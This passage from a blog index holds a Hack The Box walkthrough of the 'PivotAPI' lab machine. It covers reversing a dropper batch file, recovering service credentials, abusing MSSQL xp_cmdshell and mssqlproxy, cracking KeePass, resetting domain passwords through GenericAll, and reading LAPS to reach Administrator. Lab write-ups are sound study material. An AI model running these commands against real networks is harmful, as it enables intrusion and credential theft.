called \u0026#34;Reset-Service.exe\u0026#34; was created to log in to Oracle and restart the service. Any doubt do not hesitate to contact us. Greetings, The HelpDesk Team Date: Sun, 09 Aug 2020 11:42:20 +0000 MIME-Version: 1.0 Content-Type: multipart/alternative; boundary=16967873761.1De4bB9e.277836 Content-Transfer-Encoding: 7bit Subject: WinRM Service To: helpdesk@licordebellota.htb \u0026lt;helpdesk@licordebellota.htb\u0026gt; ... Good afternoon. After the last pentest, we have decided to stop externally displaying WinRM\u0026#39;s service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.) Greetings, The HelpDesk Team We have a Restart-OracleService.exe binary mentioned in the mail We probably have to reverse it └─$ file Restart-OracleService.exe Restart-OracleService.exe: PE32+ executable (console) x86-64, for MS Windows, 6 sections I\u0026rsquo;ll open it in IDA In strings view, I see a inflate 1.2.11 Copyright 1995-2017 Mark Adler It looks like a Zlib library Nothing interesting, we try executing it and monitor the process via Procmon Add Restart-OracleService.exe to filter Process Name -\u0026gt; is -\u0026gt; Restart-OracleService.exe When we start the process, we receive bunch of events in Procmon We can see that there is a process creation, where cmd tries to execute bat file If we check other events, we see that it creates bat file in AppData\\Local\\Temp directory of the user In order to capture the bat file, we can remove modify permissions from AppData\\Local\\Temp Remove delete permissions for a user that runs the binary Then run the executable again We see 2 files The content of the bat file @shift /0 @echo off if %username% == cybervaca goto correcto if %username% == frankytech goto correcto if %username% == ev4si0n goto correcto goto error :correcto ... echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \u0026gt; c:\\programdata\\oracle.txt ... echo $salida = $null; $fichero = (Get-Content C:\\ProgramData\\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(\u0026#34; \u0026#34;,\u0026#34;\u0026#34;); [System.IO.File]::WriteAllBytes(\u0026#34;c:\\programdata\\restart-service.exe\u0026#34;, [System.Convert]::FromBase64String($salida)) \u0026gt; c:\\programdata\\monta.ps1 powershell.exe -exec bypass -file c:\\programdata\\monta.ps1 del c:\\programdata\\monta.ps1 del c:\\programdata\\oracle.txt c:\\programdata\\restart-service.exe del c:\\programdata\\restart-service.exe :error Remove the user check at the start and the deletion at the end Save the file and run Now we have restart-service.exe └─$ file restart-service.exe /mnt/shared/restart-service.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 10 sections There few ways to analyse the executable We can use APIMonitor Or use x64debug to dump the memory with a password Since I never use APIMonitor, I\u0026rsquo;ll try this approach We set a filter for API calls Set it to GetProcAddress Then if start monitoring the process If you notice we have a CreateProcessWithLogonW call Creates a new process and its primary thread. Then the new process runs the specified executable file in the security context of the specified credentials (user, domain, and password). It can optionally load the user profile for a specified user. So we set our new filter to CreateProcessWithLogonW and run executable again We can see the creds svc_oracle:#oracle_s3rV1c3!2010 But the creds don\u0026rsquo;t work for smb └─$ crackmapexec smb 10.10.10.240 -u svc_oracle -p \u0026#39;#oracle_s3rV1c3!2010\u0026#39; SMB 10.10.10.240 445 PIVOTAPI [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False) SMB 10.10.10.240 445 PIVOTAPI [-] LicorDeBellota.htb\\svc_oracle:#oracle_s3rV1c3!2010 STATUS_LOGON_FAILURE But if we check bloodhound again, there are no svc_oracle user Only svc_mssql If we change username to svc_mssql it also fails But if we remember the message, that they were migrating from oracle to mssql, we could try modifying the password Change the year to 2020 and oracle to mssql, based on email And it works └─$ crackmapexec smb 10.10.10.240 -u svc_mssql -p \u0026#39;#mssql_s3rV1c3!2020\u0026#39; SMB 10.10.10.240 445 PIVOTAPI [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False) SMB 10.10.10.240 445 PIVOTAPI [+] LicorDeBellota.htb\\svc_mssql:#mssql_s3rV1c3!2020 But we don\u0026rsquo;t have access to mssql └─$ crackmapexec mssql 10.10.10.240 -u svc_mssql -p \u0026#39;#mssql_s3rV1c3!2020\u0026#39; MSSQL 10.10.10.240 1433 PIVOTAPI [*] Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:LicorDeBellota.htb) MSSQL 10.10.10.240 1433 PIVOTAPI [-] ERROR(PIVOTAPI\\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario \u0026#39;LICORDEBELLOTA\\svc_mssql\u0026#39;. If we change the username to sa to test for password-reuse, we have a hit └─$ crackmapexec mssql 10.10.10.240 -u sa -p \u0026#39;#mssql_s3rV1c3!2020\u0026#39; --local-auth MSSQL 10.10.10.240 1433 PIVOTAPI [*] Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:PIVOTAPI) MSSQL 10.10.10.240 1433 PIVOTAPI [+] sa:#mssql_s3rV1c3!2020 (Pwn3d!) Nothing interesting in the database But svc_mssql is winrm user, so probably winrm port is firewalled We can use mssql_shell or impacket-mssqlclient with xp_cmdshell to get a reverse shell Download nc and execute to it to get reverse shell But this is uninteded way └─$ impacket-mssqlclient sa:\u0026#39;#mssql_s3rV1c3!2020\u0026#39;@10.10.10.240 Impacket v0.11.0 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a \u0026#39;master\u0026#39;. [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (sa dbo@master)\u0026gt; xp_cmdshell output ------ NULL SQL (sa dbo@master)\u0026gt; xp_cmdshell whoami output --------------------------- nt service\\mssql$sqlexpress NULL Intended way is to use mssqlproxy python3 version Download 2 dlls from releases Rename assembly.dll to Microsoft.SqlServer.Proxy.dll └─$ git clone https://github.com/0xdf-0xdf/mssqlproxy -b python3 Cloning into \u0026#39;mssqlproxy\u0026#39;... remote: Enumerating objects: 36, done. remote: Counting objects: 100% (36/36), done. remote: Compressing objects: 100% (31/31), done. remote: Total 36 (delta 13), reused 23 (delta 4), pack-reused 0 Receiving objects: 100% (36/36), 172.33 KiB | 625.00 KiB/s, done. Resolving deltas: 100% (13/13), done. └─$ mv assembly.dll Microsoft.SqlServer.Proxy.dll Now we connect to box and upload second dll reciclador.dll there change import thread to import _thread └─$ python3 mssqlclient.py sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra mssqlproxy - Copyright 2020 BlackArrow [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a \u0026#39;master\u0026#39;. [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL\u0026gt; enable_ole SQL\u0026gt; upload reciclador.dll C:\\windows\\temp\\reciclador.dll [+] Uploading \u0026#39;reciclador.dll\u0026#39; to \u0026#39;C:\\windows\\temp\\reciclador.dll\u0026#39;... [+] Size is 111616 bytes [+] Upload completed SQL\u0026gt; └─$ python3 mssqlclient.py \u0026#39;LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; -install -clr Microsoft.SqlServer.Proxy.dll Impacket v0.11.0 - Copyright 2023 Fortra mssqlproxy - Copyright 2020 BlackArrow [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a \u0026#39;master\u0026#39;. [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [*] Proxy mode: install [*] CLR enabled [*] Assembly successfully installed [*] Procedure successfully installed └─$ python3 mssqlclient.py \u0026#39;LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; -check -reciclador \u0026#39;C:\\windows\\temp\\reciclador.dll\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra mssqlproxy - Copyright 2020 BlackArrow [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a \u0026#39;master\u0026#39;. [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [*] Proxy mode: check [*] Assembly is installed [*] Procedure is installed [*] reciclador is installed [*] clr enabled └─$ python3 mssqlclient.py \u0026#39;LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; -start -reciclador \u0026#39;C:\\windows\\temp\\reciclador.dll\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra mssqlproxy - Copyright 2020 BlackArrow [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a \u0026#39;master\u0026#39;. [*] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [*] Proxy mode: check [*] Assembly is installed [*] Procedure is installed [*] reciclador is installed [*] clr enabled [*] Proxy mode: start [*] Triggering Proxy Via MSSQL, waiting for ACK [*] ACK from server! [*] Listening on port 1337... Now if we check netstat, we have 1137 port listening └─$ sudo netstat -tulpn | grep 1337 [sudo] password for kali: tcp 0 0 0.0.0.0:1337 0.0.0.0:* LISTEN 245854/python3 Add entry socks5 127.0.0.1 1337 to /etc/proxychains.conf Since we saw that svc_mssql is has winrm rights, if we check winrm port it\u0026rsquo;s open └─$ proxychains nmap -Pn -p 5985 127.0.0.1 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 13:45 BST Nmap scan report for localhost (127.0.0.1) Host is up (0.35s latency). PORT STATE SERVICE 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds Now we can evil-winrm └─$ proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p \u0026#39;#mssql_s3rV1c3!2020\u0026#39; [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_mssql\\Documents\u0026gt; User #1 If we check svc_mssql\u0026rsquo;s desktop, we have creds *Evil-WinRM* PS C:\\Users\\svc_mssql\u0026gt; ls desktop Directorio: C:\\Users\\svc_mssql\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/8/2020 10:12 PM 2286 credentials.kdbx -a---- 4/30/2021 10:39 AM 93 note.txt Download kdbx *Evil-WinRM* PS C:\\Users\\svc_mssql\\desktop\u0026gt; type note.txt Long running MSSQL Proxies can cause issues. Please switch to SSH after getting credentials. *Evil-WinRM* PS C:\\Users\\svc_mssql\\desktop\u0026gt; download credentials.kdbx Info: Downloading C:\\Users\\svc_mssql\\desktop\\credentials.kdbx to credentials.kdbx Info: Download successful! Let\u0026rsquo;s crack it └─$ keepass2john credentials.kdbx \u0026gt; credentials.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt credentials.hash Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 60000 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status mahalkita (credentials) 1g 0:00:00:01 DONE (2023-10-12 13:50) 0.7246g/s 144.9p/s 144.9c/s 144.9C/s alyssa..september Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s find a password └─$ echo \u0026#34;mahalkita\u0026#34; | kpcli -kdb credentials.kdbx Provide the master password: ************************* KeePass CLI (kpcli) v3.8.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; ls === Groups === Database/ kpcli:/\u0026gt; cd Database/ kpcli:/Database\u0026gt; ls === Groups === eMail/ General/ Homebanking/ Internet/ Network/ Recycle Bin/ Windows/ kpcli:/Database\u0026gt; I found creds in Windows folder kpcli:/Database\u0026gt; cd Windows/ kpcli:/Database/Windows\u0026gt; ls === Entries === 0. SSH kpcli:/Database/Windows\u0026gt; show -f SSH Path: /Database/Windows/ Title: SSH Uname: 3v4Si0N Pass: Gu4nCh3C4NaRi0N!23 URL: Notes: And they work for ssh └─$ sshpass -p \u0026#39;Gu4nCh3C4NaRi0N!23\u0026#39; ssh 3v4Si0N@10.10.10.240 Microsoft Windows [Versión 10.0.17763.1879] (c) 2018 Microsoft Corporation. Todos los derechos reservados. licordebellota\\3v4si0n@PIVOTAPI C:\\Users\\3v4Si0N\u0026gt; User #2 There is a Developers folder, but we don\u0026rsquo;t have access to it licordebellota\\3v4si0n@PIVOTAPI C:\\\u0026gt;dir El volumen de la unidad C no tiene etiqueta. El número de serie del volumen es: 94DB-AFCA Directorio de C:\\ 08/08/2020 19:23 \u0026lt;DIR\u0026gt; Developers 08/08/2020 12:53 \u0026lt;DIR\u0026gt; inetpub 08/08/2020 22:48 \u0026lt;DIR\u0026gt; PerfLogs 19/02/2021 14:42 \u0026lt;DIR\u0026gt; Program Files 09/08/2020 17:06 \u0026lt;DIR\u0026gt; Program Files (x86) 08/08/2020 19:46 \u0026lt;DIR\u0026gt; Users 29/04/2021 17:31 \u0026lt;DIR\u0026gt; Windows 0 archivos 0 bytes 7 dirs 4.425.191.424 bytes libres licordebellota\\3v4si0n@PIVOTAPI C:\\\u0026gt;dir Developers El volumen de la unidad C no tiene etiqueta. El número de serie del volumen es: 94DB-AFCA Directorio de C:\\Developers No se encuentra el archivo The bloodhound shows GenericAll rights over few users We know there is a developers group in the domain We could assume they have access to that folder licordebellota\\3v4si0n@PIVOTAPI C:\\\u0026gt;net group /domain Cuentas de grupo de \\\\PIVOTAPI ------------------------------------------------------------------------------- *Administradores clave *Administradores clave de la organización *Administradores de empresas *Administradores de esquema *Admins. del dominio *Controladores de dominio *Controladores de dominio clonables *Controladores de dominio de sólo lectura *Developers *DnsUpdateProxy *Enterprise Domain Controllers de sólo lectura *Equipos del dominio *Invitados del dominio *LAPS ADM *LAPS READ *Propietarios del creador de directivas de grupo *Protected Users *Usuarios del dominio *WinRM Se ha completado el comando correctamente. If we specify the target as Developers in bloodhound, we see the path Let\u0026rsquo;s download Powerview and change Dr.Zaiuss\u0026rsquo;s password └─$ sshpass -p \u0026#39;Gu4nCh3C4NaRi0N!23\u0026#39; scp powerview.ps1 3v4Si0N@10.10.10.240:\u0026#39;C:\\programdata\\powerview.ps1\u0026#39; Change the password PS C:\\Programdata\u0026gt; import-module .\\powerview.ps1 PS C:\\Programdata\u0026gt; $pass = ConvertTo-SecureString \u0026#39;P@ssw0rd123\u0026#39; -AsPlainText -Force PS C:\\Programdata\u0026gt; Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass PS C:\\Programdata\u0026gt; dr.zaiuss is not ssh user, but has rights to winrm We can configure port forwarding via ssh And connect as dr.zaiuss └─$ sshpass -p \u0026#39;Gu4nCh3C4NaRi0N!23\u0026#39; ssh 3v4Si0N@10.10.10.240 -L 5985:127.0.0.1:5985 Microsoft Windows [Versión 10.0.17763.1879] (c) 2018 Microsoft Corporation. Todos los derechos reservados. licordebellota\\3v4si0n@PIVOTAPI C:\\Users\\3v4Si0N\u0026gt; And now connect as dr.zaiuss └─$ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p \u0026#39;P@ssw0rd123\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Dr.Zaiuss\\Documents\u0026gt; User #3 Now we change superfume\u0026rsquo;s password *Evil-WinRM* PS C:\\programdata\u0026gt; import-module .\\powerview.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; $pass = ConvertTo-SecureString \u0026#39;P@ssw0rd123\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\programdata\u0026gt; Set-DomainUserPassword -Identity superfume -AccountPassword $pass *Evil-WinRM* PS C:\\programdata\u0026gt; Now connect to winrm └─$ evil-winrm -i 127.0.0.1 -u superfume -p \u0026#39;P@ssw0rd123\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\superfume\\Documents\u0026gt; User #4 Now we can access Developers folder *Evil-WinRM* PS C:\\Developers\u0026gt; dir Directorio: C:\\Developers Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 8/8/2020 7:26 PM Jari d----- 8/8/2020 7:23 PM Superfume We have 2 files inside Jari\u0026rsquo;s folder *Evil-WinRM* PS C:\\Developers\u0026gt;ls jari Directorio: C:\\Developers\\jari Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/8/2020 7:26 PM 3676 program.cs -a---- 8/8/2020 7:18 PM 7168 restart-mssql.exe Download them program.cs indicates that it uses Jari\u0026rsquo;s creds, but it\u0026rsquo;s incomplete The password is decrypted using RC4 before restarting the service But it\u0026rsquo;s empty Let\u0026rsquo;s reverse engineer the binary We can set a breakpoint and start it We see an array Right-click and Show in Memory Window We see our password And we can winrm └─$ evil-winrm -i 127.0.0.1 -u jari -p \u0026#39;Cos@Chung@!RPG\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\jari\\Documents\u0026gt; Root We have a path to Laps Adm and Laps Read groups LAPS We have to change gibdeon\u0026rsquo;s password, who\u0026rsquo;s a member of Account Operators Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights. *Evil-WinRM* PS C:\\programdata\u0026gt; import-module .\\poweview.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; $pass = ConvertTo-SecureString \u0026#39;P@ssw0rd123\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\programdata\u0026gt; Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass *Evil-WinRM* PS C:\\programdata\u0026gt; $cred = New-Object System.Management.Automation.PSCredential(\u0026#39;gibdeon\u0026#39;, $pass) Now we can execute commands a gibdeon I\u0026rsquo;ll add jari to LAPS Read group *Evil-WinRM* PS C:\\programdata\u0026gt; Add-DomainGroupMember -Identity \u0026#39;LAPS READ\u0026#39; -Credential $cred -Members \u0026#39;jari\u0026#39; *Evil-WinRM* PS C:\\programdata\u0026gt; whoami /groups INFORMACIàN DE GRUPO -------------------- Nombre de grupo Tipo SID Atributos ================================================================== ============== ============================================= ======================================================================== Todos Grupo conocido S-1-1-0 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado BUILTIN\\Usuarios de administraci¢n remota Alias S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado BUILTIN\\Usuarios Alias S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado BUILTIN\\Acceso compatible con versiones anteriores de Windows 2000 Alias S-1-5-32-554 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\NETWORK Grupo conocido S-1-5-2 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\Usuarios autentificados Grupo conocido S-1-5-11 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\Esta compa¤¡a Grupo conocido S-1-5-15 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado LICORDEBELLOTA\\Developers Grupo S-1-5-21-842165252-2479896602-2762773115-1126 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado LICORDEBELLOTA\\WinRM Grupo S-1-5-21-842165252-2479896602-2762773115-1125 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\Autenticaci¢n NTLM Grupo conocido S-1-5-64-10 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado Etiqueta obligatoria\\Nivel obligatorio medio alto Etiqueta S-1-16-8448 *Evil-WinRM* PS C:\\programdata\u0026gt; exit Info: Exiting with code 0 Relogin for the changes to take effect └─$ evil-winrm -i 127.0.0.1 -u jari -p \u0026#39;Cos@Chung@!RPG\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\jari\\Documents\u0026gt; whoami /groups INFORMACIàN DE GRUPO -------------------- Nombre de grupo Tipo SID Atributos ================================================================== ============== ============================================= ======================================================================== Todos Grupo conocido S-1-1-0 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado BUILTIN\\Usuarios de administraci¢n remota Alias S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado BUILTIN\\Usuarios Alias S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado BUILTIN\\Acceso compatible con versiones anteriores de Windows 2000 Alias S-1-5-32-554 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\NETWORK Grupo conocido S-1-5-2 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\Usuarios autentificados Grupo conocido S-1-5-11 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\Esta compa¤¡a Grupo conocido S-1-5-15 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado LICORDEBELLOTA\\Developers Grupo S-1-5-21-842165252-2479896602-2762773115-1126 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado LICORDEBELLOTA\\LAPS READ Grupo S-1-5-21-842165252-2479896602-2762773115-1114 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado LICORDEBELLOTA\\WinRM Grupo S-1-5-21-842165252-2479896602-2762773115-1125 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado NT AUTHORITY\\Autenticaci¢n NTLM Grupo conocido S-1-5-64-10 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado Etiqueta obligatoria\\Nivel obligatorio medio alto Etiqueta S-1-16-8448 Retrieve password *Evil-WinRM* PS C:\\Users\\jari\\Documents\u0026gt; Get-ADComputer PivotAPI -property \u0026#39;ms-mcs-admpwd\u0026#39; DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb DNSHostName : PivotAPI.LicorDeBellota.htb Enabled : True ms-mcs-admpwd : hrn38Rhix9Tdx7XR2XG4 Name : PIVOTAPI ObjectClass : computer ObjectGUID : 98783674-e6a3-4d9e-87e3-efe5f31fabbf SamAccountName : PIVOTAPI$ SID : S-1-5-21-842165252-2479896602-2762773115-1004 UserPrincipalName : Now we can winrm as Administrador └─$ evil-winrm -i 127.0.0.1 -u administrador -p \u0026#39;hrn38Rhix9Tdx7XR2XG4\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\administrador\\Documents\u0026gt; ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/pivotapi/images/pivotapi.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/pivotapi/","summary":"PivotAPI Enumeration nmap └─$ nmap -Pn -p- 10.10.10.240 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:10 BST Nmap scan report for 10.10.10.240 (10.10.10.240) Host is up (0.10s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49708/tcp open unknown 52843/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 65.","tags":["HTB","active-directory","exiftool","as-rep-roast","getuserspns","hashcat","mssql","mssqlclient","bloodhound","smbmap","smbclient","mbox","mutt","msgconvert","reverse-engineering","procmon","vbs","api-monitor","crackmapexec","mssql-shell","mssqlproxy","evil-winrm","keepass","genericall","powersploit","powerview","tunnel","dotnet","dnspy","forcechangepassword","laps","winpeas","powershell-run-as"],"title":"[HTB] Machine: PivotAPI"},{"categories":null,"contents":"Reel2 Enumeration nmap └─$ nmap -Pn -p- 10.10.10.210 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:51 BST Nmap scan report for 10.10.10.210 (10.10.10.210) Host is up (0.10s latency). Not shown: 65521 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https 5985/tcp open wsman 6004/tcp open X11:4 6005/tcp open X11:5 6006/tcp open X11:6 6007/tcp open X11:7 6008/tcp open X11:8 6010/tcp open x11 6011/tcp open x11 6012/tcp open x11 6021/tcp open x11 6135/tcp open unknown 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 44.05 seconds └─$ nmap -Pn -p80,443,5985,6001-6012,6021,6165,8080 -sC -sV 10.10.10.210 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:56 BST Nmap scan report for 10.10.10.210 (10.10.10.210) Host is up (0.11s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 |_http-server-header: Microsoft-IIS/8.5 |_http-title: 403 - Forbidden: Access is denied. 443/tcp open ssl/http Microsoft IIS httpd 8.5 | ssl-cert: Subject: commonName=Reel2 | Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local | Not valid before: 2020-07-30T10:12:46 |_Not valid after: 2025-07-30T10:12:46 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_ssl-date: 2023-10-03T18:57:18+00:00; -43s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 6001/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6002/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6003/tcp filtered X11:3 6004/tcp filtered X11:4 6005/tcp filtered X11:5 6006/tcp open msrpc Microsoft Windows RPC 6007/tcp open msrpc Microsoft Windows RPC 6008/tcp open msrpc Microsoft Windows RPC 6009/tcp filtered X11:9 6010/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6011/tcp filtered x11 6012/tcp open msrpc Microsoft Windows RPC 6021/tcp filtered x11 6165/tcp filtered unknown 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32 |_http-title: Welcome | Wallstant Service Info: OS: Windows; CPE: 